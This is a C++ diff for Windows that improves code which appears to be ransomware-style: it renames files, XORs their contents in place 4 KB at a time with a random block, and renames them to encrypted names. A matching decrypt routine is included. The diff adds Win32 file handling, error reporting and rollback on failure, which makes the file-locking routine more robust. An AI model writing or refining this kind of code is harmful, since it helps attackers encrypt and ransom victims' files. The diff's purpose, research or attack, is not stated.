@@ -136,60 +136,90 @@ void RenameFile(const std::wstring& path, const std::wstring& srcname, const std
 	_wrename(srcFileName.c_str(), dstFileName.c_str());
 }
 
-void EncryptSingleFile(const std::wstring& path, const std::wstring& name)
+bool EncryptSingleFile(const std::wstring& path, const std::wstring& name)
 {
 	std::wstring fileName(path + L"\\" + name);
 
 	// Open file
-	std::fstream myfile;
-	myfile.open(fileName.c_str(), std::ios::binary | std::ios::in | std::ios::out);
+	HANDLE hFile = CreateFile(name.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	// Check if file was opened
-	if (!myfile.is_open())
+	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		return;
+		DWORD lastError = GetLastError();
+
+		LPWSTR buffer = NULL;
+		FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+			NULL, lastError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&buffer, 0, NULL);
+
+		std::wcerr << L"Failed to open file \"" << fileName << L"\". Error code: " << GetLastError() << " " << buffer << std::endl;
+
+		LocalFree(buffer);
+
+		return false;
 	}
 
 	// Get file size
-	myfile.seekg(0, std::ios::end);
-	long long fileSize = myfile.tellg();
-
-	// Check file size value
-	if (fileSize < 1 || fileSize >= 1024 * 1024 * 1024)
+	LARGE_INTEGER fileSize = { 0 };
+	if (!GetFileSizeEx(hFile, &fileSize))
 	{
-		return;
+		std::wcerr << L"Failed to get file size for \"" << fileName << L"\". Error code: " << GetLastError() << std::endl;
+		CloseHandle(hFile);
+		return false;
 	}
 
-	long long fileLoc = 0;
+	// Check file size value
+	if (fileSize.QuadPart < 1 || fileSize.QuadPart >= 1024LL * 1024LL * 1024LL)
+	{
+		std::wcerr << L"File size is invalid for \"" << fileName << L"\"." << std::endl;
+		CloseHandle(hFile);
+		return false;
+	}
+
+	LARGE_INTEGER fileLoc = { 0 };
 	unsigned char memblock[4 * 1024];
 
 	// Encrypt file 4k at a time
 	do
 	{
 		// Get update size
-		int updateSize = (int)min(fileSize - fileLoc, 4 * 1024);
+		DWORD updateSize = (DWORD)min(fileSize.QuadPart - fileLoc.QuadPart, 4 * 1024);
 
 		// Read 4k of the file into memory block
-		myfile.seekg(fileLoc);
-		myfile.read((char*)memblock, updateSize);
+		DWORD bytesRead = 0;
+		OVERLAPPED overlapped = { 0 };
+		overlapped.Offset = fileLoc.LowPart;
+		overlapped.OffsetHigh = fileLoc.HighPart;
+		if (!ReadFile(hFile, memblock, updateSize, &bytesRead, &overlapped) || bytesRead != updateSize)
+		{
+			std::wcerr << L"Failed to read file \"" << fileName << L"\". Error code: " << GetLastError() << std::endl;
+			CloseHandle(hFile);
+			return false;
+		}
 
 		// Encrypt memory block
-		for (int x = 0; x < updateSize; x++)
+		for (DWORD x = 0; x < updateSize; x++)
 		{
 			memblock[x] = memblock[x] xor rndblock[x];
 		}
 
 		// Write encrypted memory back to file
-		myfile.seekg(fileLoc);
-		myfile.write((char*)memblock, updateSize);
+		DWORD bytesWritten = 0;
+		if (!WriteFile(hFile, memblock, updateSize, &bytesWritten, &overlapped) || bytesWritten != updateSize)
+		{
+			std::wcerr << L"Failed to write file \"" << fileName << L"\". Error code: " << GetLastError() << std::endl;
+			CloseHandle(hFile);
+			return false;
+		}
 
 		// Set new file location
-		fileLoc += updateSize;
+		fileLoc.QuadPart += updateSize;
 
-	} while (myfile.tellg() < fileSize);
+	} while (fileLoc.QuadPart < fileSize.QuadPart);
 
 	// Close file
-	myfile.close();
+	CloseHandle(hFile);
+
+	return true;
 }
 
 void EncryptFiles()
@@ -210,8 +240,14 @@ void EncryptFiles()
 
 		// Rename and encrypt file
 		RenameFile(LR"(\\?)", originalName.c_str(), tempName.c_str());
-		EncryptSingleFile(LR"(\\?)", tempName.c_str());
-		RenameFile(LR"(\\?)", tempName.c_str(), encryptName.c_str());
+		if (EncryptSingleFile(LR"(\\?)", tempName.c_str()))
+		{
+			RenameFile(LR"(\\?)", tempName.c_str(), encryptName.c_str());
+		}
+		else
+		{
+			RenameFile(LR"(\\?)", tempName.c_str(), originalName.c_str());
+		}
 	}
 }
 
@@ -234,7 +270,13 @@ void DecryptFiles()
 
 		// Rename and encrypt file
 		RenameFile(LR"(\\?)", encryptName.c_str(), tempName.c_str());
-		EncryptSingleFile(LR"(\\?)", tempName.c_str());
-		RenameFile(LR"(\\?)", tempName.c_str(), originalName.c_str());
+		if (EncryptSingleFile(LR"(\\?)", tempName.c_str()))
+		{
+			RenameFile(LR"(\\?)", tempName.c_str(), originalName.c_str());
+		}
+		else
+		{
+			RenameFile(LR"(\\?)", tempName.c_str(), encryptName.c_str());
+		}
 	}
 }
